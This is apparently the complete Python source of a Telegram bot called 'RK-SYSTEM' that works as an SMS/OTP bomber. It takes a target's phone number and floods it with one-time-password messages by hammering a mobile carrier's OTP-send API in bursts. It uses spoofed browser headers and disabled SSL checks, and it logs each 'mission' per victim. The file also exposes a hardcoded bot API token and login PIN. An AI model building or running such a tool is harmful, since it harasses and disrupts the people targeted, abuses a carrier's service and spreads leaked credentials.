import telebot
import requests
import asyncio
import aiohttp
import threading
import time
import json
import os
import pytz
import ssl
from datetime import datetime
from telebot import types
from flask import Flask

# ---------- WEB SERVER FOR RENDER ----------
app = Flask(__name__)

@app.route('/')
def home():
    return "RK-SYSTEM IS ALIVE!"

def run_web():
    app.run(host='0.0.0.0', port=10000)

# ---------- CONFIG ----------
API_TOKEN = '8519607285:AAFFBo2m3QiMmh00MUzt3Q6DbVWAipa5INg'
bot = telebot.TeleBot(API_TOKEN)

LOGIN_PIN = "RK2026"
BD_TZ = pytz.timezone('Asia/Dhaka')
HISTORY_FILE = "bombing_history.json"
WAKEUP_URL = "https://rksystemx.onrender.com/"

# ---------- DATA STORAGE ----------
def load_history():
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, "r") as f:
                return json.load(f)
        except: return {}
    return {}

def save_history(data):
    with open(HISTORY_FILE, "w") as f:
        json.dump(data, f, indent=4)

user_data = {}
history_db = load_history()
logged_in_users = set()

# ---------- HIGH POWER SIM API (SSL BYPASS & FIXED) ----------
async def fire_sim_api(session, target):
    """Robi/Airtel High Speed API Call with Correct Format"""
    # Robi API usually needs number like 018... or 88018... 
    # Let's ensure it's the exact 11 digit 01xxxxxxxxx
    url = "https://api.robi.com.bd/robi-api/v1/otp/send"
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Origin": "https://www.robi.com.bd",
        "Referer": "https://www.robi.com.bd/",
        "Accept": "application/json, text/plain, */*"
    }
    
    payload = {"msisdn": target}
    
    try:
        # SSL Verification False kora hoyeche jeno Render e request fail na hoy
        async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False) as resp:
            # print(f"DEBUG: Status {resp.status}") # Trace korar jonno use korte paren
            return resp.status in [200, 201, 202]
    except Exception as e:
        # print(f"DEBUG Error: {e}")
        return False

# ---------- BOMBING ENGINE (ASYNC) ----------
def run_async_bomb(chat_id, phone, amount, msg_id):
    asyncio.run(bomb_task(chat_id, phone, amount, msg_id))

async def bomb_task(chat_id, phone, amount, msg_id):
    success, failed = 0, 0
    start_time = datetime.now(BD_TZ)
    user_data[chat_id].update({'status': 'running', 'round': 0, 'start_time': start_time})

    # TCPConnector use kora hoyeche speed baranor jonno
    connector = aiohttp.TCPConnector(limit=100, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        for r in range(1, amount + 1):
            if user_data.get(chat_id, {}).get('status') == 'stopped': break
            while user_data.get(chat_id, {}).get('status') == 'paused':
                await asyncio.sleep(1)

            # Eki shathe 5-10 ti request burst kora hobe
            tasks = [fire_sim_api(session, phone) for _ in range(5)]
            results = await asyncio.gather(*tasks)
            
            for res in results:
                if res: success += 1
                else: failed += 1

            user_data[chat_id].update({'success': success, 'failed': failed, 'round': r})
            
            running_time = str(datetime.now(BD_TZ) - start_time).split('.')[0]
            update_bombing_ui(chat_id, phone, amount, msg_id, running_time)
            await asyncio.sleep(0.3) # API rate limit theke bachte halka delay

    log_time = datetime.now(BD_TZ).strftime('%d/%m/%y | %I:%M %p')
    log_entry = f"🕒 {log_time} | ✅ {success} | ❌ {failed} | Rounds: {amount}"
    uid = str(chat_id)
    if uid not in history_db: history_db[uid] = {}
    if phone not in history_db[uid]: history_db[uid][phone] = []
    history_db[uid][phone].append(log_entry)
    save_history(history_db)

    bot.edit_message_text(f"🏁 **MISSION COMPLETED**\n\n🎯 Target: `{phone}`\n✅ Total Success: `{success}`\n⏱ Time: `{str(datetime.now(BD_TZ)-start_time).split('.')[0]}`", chat_id, msg_id)
    user_data[chat_id]['status'] = 'idle'

def update_bombing_ui(chat_id, phone, amount, msg_id, running_time):
    data = user_data[chat_id]
    text = (
        f"⚡ **RK-SYSTEM ONLY SIM API** ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"📱 Target: `{phone}`\n"
        f"🔄 Progress: `[{data['round']}/{amount}]`\n"
        f"✅ Sent: `{data['success']}`\n"
        f"❌ Fail: `{data['failed']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"⏱ Running: `{running_time}`\n"
        f"🕒 Time: `{datetime.now(BD_TZ).strftime('%I:%M:%S %p')}`"
    )
    markup = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton("⏸ Pause" if data['status']=='running' else "▶ Resume", callback_data="pause_resume")
    markup.add(btn, types.InlineKeyboardButton("🛑 Stop", callback_data="stop"))
    try: bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
    except: pass

# ---------- HANDLERS ----------
@bot.message_handler(commands=['start'])
def welcome(message):
    chat_id = message.chat.id
    if str(chat_id) not in logged_in_users:
        bot.send_message(chat_id, "🔐 **ACCESS DENIED!**\n\nLogin korte bolun: `/login RK2026`", parse_mode="Markdown")
    else:
        main_menu(chat_id)

@bot.message_handler(commands=['login'])
def login(message):
    if len(message.text.split()) > 1 and message.text.split()[1] == LOGIN_PIN:
        logged_in_users.add(str(message.chat.id))
        bot.reply_to(message, "✅ Login Successful!")
        main_menu(message.chat.id)
    else:
        bot.reply_to(message, "❌ Wrong Pin!")

def main_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🚀 Start SIM Bomb", callback_data="setup"),
               types.InlineKeyboardButton("📜 View History", callback_data="history_main"))
    bot.send_message(chat_id, "💎 **RK-SYSTEM CONTROL PANEL**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    uid = str(chat_id)
    if call.data == "setup":
        msg = bot.send_message(chat_id, "📞 **Phone Number din:**")
        bot.register_next_step_handler(msg, get_number)
    elif call.data == "history_main":
        if uid not in history_db or not history_db[uid]:
            bot.answer_callback_query(call.id, "History empty!")
            return
        markup = types.InlineKeyboardMarkup()
        for phone in history_db[uid].keys():
            markup.add(types.InlineKeyboardButton(f"📱 {phone}", callback_data=f"h_{phone}"))
        bot.edit_message_text("📜 **History List:**", chat_id, call.message.message_id, reply_markup=markup)
    elif call.data.startswith("h_"):
        phone = call.data.split("_")[1]
        logs = history_db[uid][phone]
        bot.edit_message_text(f"📜 **Log for {phone}:**\n\n" + "\n".join(logs[-10:]), chat_id, call.message.message_id, 
                              reply_markup=types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("⬅️ Back", callback_data="history_main")))
    elif call.data == "confirm_attack":
        data = user_data[chat_id]
        bot.delete_message(chat_id, call.message.message_id)
        msg = bot.send_message(chat_id, "🚀 **Attack Launching...**")
        threading.Thread(target=run_async_bomb, args=(chat_id, data['target'], data['amount'], msg.message_id)).start()
    elif call.data == "pause_resume":
        user_data[chat_id]['status'] = "paused" if user_data[chat_id]['status'] == "running" else "running"
    elif call.data == "stop":
        user_data[chat_id]['status'] = "stopped"

def get_number(message):
    if not message.text.isdigit() or len(message.text) != 11:
        bot.reply_to(message, "❌ Vul number! Correct 11 digit number din.")
        return
    user_data[message.chat.id] = {'target': message.text}
    msg = bot.send_message(message.chat.id, "📊 **Round din (Max 100):**")
    bot.register_next_step_handler(msg, get_amount)

def get_amount(message):
    try:
        amount = min(int(message.text), 100)
        user_data[message.chat.id]['amount'] = amount
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✅ CONFIRM", callback_data="confirm_attack"),
                                                types.InlineKeyboardButton("❌ CANCEL", callback_data="setup"))
        bot.send_message(message.chat.id, f"🎯 Target: `{user_data[message.chat.id]['target']}`\n📊 Rounds: `{amount}`\n\nConfirm?", reply_markup=markup, parse_mode="Markdown")
    except: bot.reply_to(message, "❌ Number din.")

# ---------- WAKEUP ----------
def wakeup():
    while True:
        try: requests.get(WAKEUP_URL, timeout=10)
        except: pass
        time.sleep(600)

if __name__ == "__main__":
    threading.Thread(target=run_web, daemon=True).start()
    threading.Thread(target=wakeup, daemon=True).start()
    print("✅ RK-SYSTEM SIM-ONLY BOT IS ONLINE")
    bot.infinity_polling()
